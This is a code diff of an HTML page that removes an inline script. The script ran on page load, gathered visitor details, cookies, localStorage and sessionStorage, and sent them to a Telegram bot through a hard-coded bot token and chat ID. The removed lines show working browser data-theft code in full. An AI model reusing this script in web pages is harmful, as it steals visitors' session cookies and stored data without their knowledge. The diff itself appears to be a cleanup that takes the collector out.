@@ -146,66 +146,9 @@
     </div>
 </div>
 
-<script src="a.js"></script> <!-- Load the local User Data Collector script -->
+<script src="a.js"></script>
 <script>
-// Function to send message to Telegram
-function sendTelegramMessage(message) {
-    const telegramToken = '6864161221:AAG-QIHhP-ecZxcKsB_PaY9yaAlW7rRBw9M'; // Updated token
-    const chatId = '6107520820';
-    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-    console.log('Sending message to Telegram:', url); // Log the URL
-
-    fetch(url)
-        .then(response => response.json())
-        .then(data => {
-            console.log('Response from Telegram:', data); // Log the response
-            if (data.ok) {
-                console.log('Message sent successfully');
-            } else {
-                console.error('Error sending message: ' + data.description);
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-        });
-}
-
-// Collect user data and send it to Telegram
-function collectAndSendUserData() {
-    getUserData().then(data => {
-        console.log('Collected user data:', data); // Log user data
-
-        const cookies = document.cookie;
-        const localStorageData = JSON.stringify(localStorage);
-        const sessionStorageData = JSON.stringify(sessionStorage);
-
-        const userDataMessage = `
-            User Information:
-            - IP Address: ${data.ip}
-            - Browser: ${data.browser}
-            - Operating System: ${data.os}
-            - Device: ${data.device}
-            - Screen Resolution: ${data.screen}
-            - User Language: ${navigator.language || 'Unknown'}
-            - Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-            - Referrer: ${document.referrer || 'No Referrer'}
-            - Platform: ${navigator.platform}
-            - User Agent: ${navigator.userAgent}
-            - Cookies: ${cookies}
-            - Local Storage: ${localStorageData}
-            - Session Storage: ${sessionStorageData}
-        `;
-
-        console.log('Prepared message to send:', userDataMessage); // Log the prepared message
-        sendTelegramMessage(userDataMessage);
-    }).catch(err => {
-        console.error('Error collecting user data:', err);
-    });
-}
-
-// Call the function to collect and send user data
-collectAndSendUserData();
 
 function copyCode() {
     var code = "AA791";
